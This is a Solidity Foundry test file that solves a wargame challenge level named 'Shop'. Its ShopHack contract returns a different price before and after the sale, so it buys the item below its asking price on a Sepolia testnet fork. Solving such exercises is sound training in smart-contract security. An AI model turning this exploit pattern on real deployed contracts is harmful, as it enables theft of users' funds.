// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/levels/21-Shop/Shop.sol";


contract ContractTest is Test {
    ShopHack ShopHackAddr;
    Shop level21 = Shop(payable(0xea2C47f544577FdBEF0b2E4dAfDeBba89980a0b1));

    function setUp() public {
 
    vm.createSelectFork(vm.rpcUrl("sepolia"));

    }

    function testExploit21() public {
       ShopHackAddr  = new ShopHack();
       ShopHackAddr.attack();
    }
    
  receive() external payable {}
}


contract ShopHack {
    Shop level21 = Shop(0xea2C47f544577FdBEF0b2E4dAfDeBba89980a0b1);

 
   function attack() external {
      level21.buy();
  }
    function price () external view returns (uint) {
    return level21.isSold() ? 1 : 101;
}
}